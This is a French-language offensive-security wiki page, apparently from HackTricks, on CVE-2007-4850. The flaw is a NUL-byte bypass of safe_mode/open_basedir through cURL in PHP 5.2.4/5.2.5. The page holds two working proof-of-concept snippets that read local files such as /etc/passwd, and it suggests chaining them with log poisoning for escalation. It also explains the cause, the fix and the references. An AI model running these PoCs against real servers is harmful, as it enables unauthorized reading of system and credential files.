# PHP 5.2.4 and 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Cette page documente une astuce ancienne mais encore utile dans les CTFs / installations locales legacy pour contourner les vérifications PHP safe_mode/open_basedir en utilisant l'extension cURL sur certaines versions de PHP 5.2.x.

- Affectés : PHP 5.2.4 et 5.2.5 avec ext/curl activé.
- Impact : Lire des fichiers locaux arbitraires malgré les restrictions safe_mode ou open_basedir (pas d'exécution de code directe).
- ID : CVE-2007-4850.

Source : http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## PoC en une ligne

Si safe_mode ou open_basedir sont actifs et que cURL est activé, ce qui suit renverra le contenu du script courant:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## PoC plus explicite (lecture arbitraire d'un fichier)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Remarques:
- Use double quotes or chr(0) to inject a real NUL byte. Percent-encoding (%00) will not work reliably.
- Ceci est une primitive de lecture de fichier. Combinez-la avec d'autres primitives (log poisoning, session file inclusion, etc.) pour une escalade supplémentaire quand possible.

## Pourquoi cela fonctionne (en bref)

La vulnérabilité tient à la manière dont PHP 5.2.4/5.2.5 effectuait les vérifications safe_mode/open_basedir pour les file:// URLs dans ext/curl. La vérification analysait l'URL et validait un composant de chemin, mais en raison de la gestion des NUL-byte elle validait une chaîne différente de celle réellement utilisée par libcurl. En pratique, le validateur pouvait approuver le chemin après le NUL tandis que libcurl utilisait la partie avant le NUL comme conteneur d'URL, permettant un contournement aboutissant à la lecture du fichier placé après le NUL-byte. Voir l'analyse originale et la macro affectée dans curl/interface.c pour les détails. [CVE-2007-4850].

## Contraintes et correctifs

- Corrigé dans les versions 5.2.x ultérieures (par ex., les distro builds patchés à 5.2.6) en corrigeant l'analyse/la validation dans ext/curl.
- N'affecte que des déploiements PHP très anciens ; safe_mode a été supprimé dans PHP 5.4 et les builds modernes ne présentent pas ce comportement.

## Voir aussi

D'autres contournements disable_functions/open_basedir et des techniques modernes sont rassemblés ici :

{{#ref}}
README.md
{{#endref}}



## Références

- Entrée Ubuntu CVE avec pointeurs de patch et versions affectées: https://ubuntu.com/security/CVE-2007-4850
- Article technique avec contexte de code (cxsecurity): http://cxsecurity.com/issue/WLB-2008010060
{{#include ../../../../banners/hacktricks-training.md}}
